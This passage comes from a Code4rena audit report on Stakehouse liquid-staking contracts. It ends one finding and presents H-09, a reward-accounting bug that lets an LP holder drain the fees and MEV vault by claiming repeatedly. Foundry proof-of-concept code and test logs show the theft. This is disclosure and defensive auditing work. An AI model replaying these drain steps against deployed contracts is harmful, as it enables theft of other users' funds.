data-index=\"22\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">forge test --match-test testDWUpdateRate2 -vvv</span></span></code></pre>\n<p>test log:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"23\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">Logs:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  user one: 0</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  user two(attacker): 6000000000000000000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  giantFeesAndMevPool: 2000000000000000000</span></span></code></pre>\n<p>The attacker stole 2 eth from the pool.</p>\n<h3 id=\"tools-used-5\" style=\"position:relative;\"><a href=\"#tools-used-5\" aria-label=\"tools used 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>foundry</p>\n<h3 id=\"recommended-mitigation-steps-7\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-7\" aria-label=\"recommended mitigation steps 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p><code>idleETH -= _amount;</code> should be after the <code>lpTokenETH.burn</code>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/129\">vince0656 (Stakehouse) confirmed</a></strong></p>\n<hr>\n<h2 id=\"h-09-incorrect-accounting-in-syndicaterewardsprocessor-results-in-any-lp-token-holder-being-able-to-steal-other-lp-tokens-holders-eth-from-the-fees-and-mev-vault\" style=\"position:relative;\"><a href=\"#h-09-incorrect-accounting-in-syndicaterewardsprocessor-results-in-any-lp-token-holder-being-able-to-steal-other-lp-tokens-holders-eth-from-the-fees-and-mev-vault\" aria-label=\"h 09 incorrect accounting in syndicaterewardsprocessor results in any lp token holder being able to steal other lp tokens holders eth from the fees and mev vault permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/147\">[H-09] Incorrect accounting in <code>SyndicateRewardsProcessor</code> results in any LP token holder being able to steal other LP tokens holder’s ETH from the fees and MEV vault</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/147\">c7e7eff</a>, also found by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/425\">Trust</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/348\">0x4non</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/300\">arcoun</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/256\">Jeiwan</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/237\">unforgiven</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/219\">cccz</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/213\">corerouter</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/208\">rotcivegaf</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/131\">koxuan</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/130\">aphak5010</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/100\">9svR6w</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/59\">HE1M</a>, and <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/39\">clems4ever</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L63\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L63</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L88\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L88</a><br></p>\n<p>The SyndicateRewardsProcessor’s internal <code>_distributeETHRewardsToUserForToken()</code> function is called from external <code>claimRewards()</code> function in the <code>StakingFundsVault</code> contract. This function is called by LP Token holders to claim their accumulated rewards based on their LP Token holdings and already claimed rewards.<br>\nThe accumulated rewards <code>due</code> are calculated as <code>((accumulatedETHPerLPShare * balance) / PRECISION)</code> reduced by the previous claimed amount stored in <code>claimed[_user][_token]</code>. When the ETH is sent to the <code>_user</code> the stored value should be increased by the <code>due</code> amount. However in the current code base the <code>claimed[_user][_token]</code> is set equal to the calculated <code>due</code>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"24\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_distributeETHRewardsToUserForToken</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_user</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_token</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_balance</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_recipient</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_recipient</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;Zero address&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">balance</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_balance</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">balance</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// Calculate how much ETH rewards the address is owed / due </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">due</span><span class=\"mtk1\"> = ((</span><span class=\"mtk12\">accumulatedETHPerLPShare</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">balance</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">PRECISION</span><span class=\"mtk1\">) - </span><span class=\"mtk12\">claimed</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_user</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_token</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">due</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">claimed</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_user</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_token</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">due</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">totalClaimed</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">due</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">success</span><span class=\"mtk1\">, ) = </span><span class=\"mtk12\">_recipient</span><span class=\"mtk1\">.</span><span class=\"mtk12\">call</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">due</span><span class=\"mtk1\">}(</span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t\t...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>This means the first time a user will claim their rewards they will get the correct amount and the correct value will be stored in the <code>claimed[_user][_token]</code>.  When extra ETH is recieved from the MEV and fees rewards and the user claims their reward again, the claimed amount will only reflect the last claimed amount. As a result they can then repeatedly claim untill the MEV and Fee vault is almost depleted.</p>\n<h3 id=\"proof-of-concept-7\" style=\"position:relative;\"><a href=\"#proof-of-concept-7\" aria-label=\"proof of concept 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Following modification to the existing <code>StakingFundsVault.t.sol</code> will provide a test to demonstrate the issue:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"25\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/test/foundry/StakingFundsVault.t.sol b/test/foundry/StakingFundsVault.t.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 53b4ce0..4db8fc8 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/test/foundry/StakingFundsVault.t.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/test/foundry/StakingFundsVault.t.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -4,6 +4,7 @@ import &quot;forge-std/console.sol&quot;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> import { StakingFundsVault } from &quot;../../contracts/liquid-staking/StakingFundsVault.sol&quot;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> import { LPToken } from &quot;../../contracts/liquid-staking/LPToken.sol&quot;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+import { SyndicateRewardsProcessor} from &quot;../../contracts/liquid-staking/SyndicateRewardsProcessor.sol&quot;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> import {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     TestUtils,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     MockLSDNFactory,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -417,4 +418,73 @@ contract StakingFundsVaultTest is TestUtils {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         assertEq(vault.totalClaimed(), rewardsAmount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         assertEq(vault.totalRewardsReceived(), rewardsAmount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    function testRepetitiveClaim() public {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        // register BLS key with the network</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        registerSingleBLSPubKey(accountTwo, blsPubKeyFour, accountFive);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        vm.label(accountOne, &quot;accountOne&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        vm.label(accountTwo, &quot;accountTwo&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        // Do a deposit of 4 ETH for bls pub key four in the fees and mev pool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        depositETH(accountTwo, maxStakingAmountPerValidator / 2, getUint256ArrayFromValues(maxStakingAmountPerValidator / 2), getBytesArrayFromBytes(blsPubKeyFour));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        depositETH(accountOne, maxStakingAmountPerValidator / 2, getUint256ArrayFromValues(maxStakingAmountPerValidator / 2), getBytesArrayFromBytes(blsPubKeyFour));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        // Do a deposit of 24 ETH for savETH pool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        liquidStakingManager.savETHVault().depositETHForStaking{value: 24 ether}(blsPubKeyFour, 24 ether);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        stakeAndMintDerivativesSingleKey(blsPubKeyFour);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        LPToken lpTokenBLSPubKeyFour = vault.lpTokenForKnot(blsPubKeyFour);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        vm.warp(block.timestamp + 3 hours);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        // Deal ETH to the staking funds vault</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256 rewardsAmount = 1.2 ether;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        console.log(&quot;depositing %s wei into the vault.\\n&quot;, rewardsAmount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        vm.deal(address(vault), rewardsAmount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        assertEq(address(vault).balance, rewardsAmount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        assertEq(vault.previewAccumulatedETH(accountOne, vault.lpTokenForKnot(blsPubKeyFour)), rewardsAmount / 2);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        assertEq(vault.previewAccumulatedETH(accountTwo, vault.lpTokenForKnot(blsPubKeyFour)), rewardsAmount / 2);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        logAccounts();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        console.log(&quot;Claiming rewards for accountOne.\\n&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        vm.prank(accountOne);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        vault.claimRewards(accountOne, getBytesArrayFromBytes(blsPubKeyFour));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        logAccounts();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        console.log(&quot;depositing %s wei into the vault.\\n&quot;, rewardsAmount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        vm.deal(address(vault), address(vault).balance + rewardsAmount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        vm.warp(block.timestamp + 3 hours);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        logAccounts();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        console.log(&quot;Claiming rewards for accountOne.\\n&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        vm.prank(accountOne);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        vault.claimRewards(accountOne, getBytesArrayFromBytes(blsPubKeyFour));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        logAccounts();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        console.log(&quot;Claiming rewards for accountOne AGAIN.\\n&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        vm.prank(accountOne);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        vault.claimRewards(accountOne, getBytesArrayFromBytes(blsPubKeyFour));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        logAccounts();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        console.log(&quot;Claiming rewards for accountOne AGAIN.\\n&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        vm.prank(accountOne);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        vault.claimRewards(accountOne, getBytesArrayFromBytes(blsPubKeyFour));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        logAccounts();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        //console.log(&quot;Claiming rewards for accountTwo.\\n&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        vm.prank(accountTwo);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        vault.claimRewards(accountTwo, getBytesArrayFromBytes(blsPubKeyFour));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    function logAccounts() internal {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        console.log(&quot;accountOne previewAccumulatedETH : %i&quot;, vault.previewAccumulatedETH(accountOne, vault.lpTokenForKnot(blsPubKeyFour)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        console.log(&quot;accountOne claimed               : %i&quot;, SyndicateRewardsProcessor(vault).claimed(accountOne, address(vault.lpTokenForKnot(blsPubKeyFour))));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        console.log(&quot;accountTwo previewAccumulatedETH : %i&quot;, vault.previewAccumulatedETH(accountTwo, vault.lpTokenForKnot(blsPubKeyFour)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        console.log(&quot;accountTwo claimed               : %i&quot;, SyndicateRewardsProcessor(vault).claimed(accountTwo, address(vault.lpTokenForKnot(blsPubKeyFour))));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        console.log(&quot;ETH Balances: accountOne: %i, accountTwo: %i, vault: %i\\n&quot;, accountOne.balance, accountTwo.balance, address(vault).balance);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> }</span></span></span></code></pre>\n<p>Note that the AccountOne repeatedly claims until the vault is empty and the claim for accountTwo fails.</p>\n<p>Following is an output of the test script showing the balances and differnet state variables:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"26\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">forge test -vv --match testRepetitiveClaim</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">[⠑] Compiling...</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">No files changed, compilation skipped</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Running 1 test for test/foundry/StakingFundsVault.t.sol:StakingFundsVaultTest</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">[FAIL. Reason: Failed to transfer] testRepetitiveClaim() (gas: 3602403)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Logs:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  depositing 1200000000000000000 wei into the vault.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  accountOne previewAccumulatedETH : 600000000000000000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  accountOne claimed               : 0</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  accountTwo previewAccumulatedETH : 600000000000000000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  accountTwo claimed               : 0</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  ETH Balances: accountOne: 0, accountTwo: 0, vault: 1200000000000000000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  Claiming rewards for accountOne.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  accountOne previewAccumulatedETH : 0</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  accountOne claimed               : 600000000000000000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  accountTwo previewAccumulatedETH : 600000000000000000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  accountTwo claimed               : 0</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  ETH Balances: accountOne: 600000000000000000, accountTwo: 0, vault: 600000000000000000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  depositing 1200000000000000000 wei into the vault.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  accountOne previewAccumulatedETH : 600000000000000000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  accountOne claimed               : 600000000000000000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  accountTwo previewAccumulatedETH : 1200000000000000000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  accountTwo claimed               : 0</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  ETH Balances: accountOne: 600000000000000000, accountTwo: 0, vault: 1800000000000000000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  Claiming rewards for accountOne.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  accountOne previewAccumulatedETH : 600000000000000000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  accountOne claimed               : 